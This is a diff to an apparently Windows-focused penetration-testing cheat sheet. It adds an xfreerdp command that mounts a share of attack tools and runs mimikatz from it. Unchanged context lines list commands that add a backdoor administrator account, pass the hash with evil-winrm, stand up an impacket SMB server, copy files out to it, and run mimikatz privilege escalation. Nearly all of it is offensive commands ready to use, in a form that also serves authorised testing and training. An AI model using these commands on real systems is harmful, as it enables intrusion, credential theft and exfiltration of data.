@@ -16,6 +16,7 @@
     netsh firewall show state 
     netsh firewall show config
     C:\Windows\System32\drivers\etc\host        Windows DNS entries 
+    
 ## Powershell
     Get-ExecutionPolicy    
     Set-ExecutionPolicy Unrestricted   
@@ -120,13 +121,15 @@ ____
      net user USERNAME PASSWORD /add
      net localgroup Administrators USERNAME /add
      net localgroup "Remote Management Users" USERNAME /add  
-     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP
+     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
+     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
+     \\tsclient\share\mimikatz\x64\mimikatz.exe 
  ____ 
  # Post Exploitation / Exfiltration 
  [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)  
      python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
      net use \\IP\share /USER:USER PASS 
-     copy FILE \\IP\share\FILE 
+     copy FILE \\IP\share\FILE  
  ## Mimikatz
      privilege::debug 
      token::elevate 
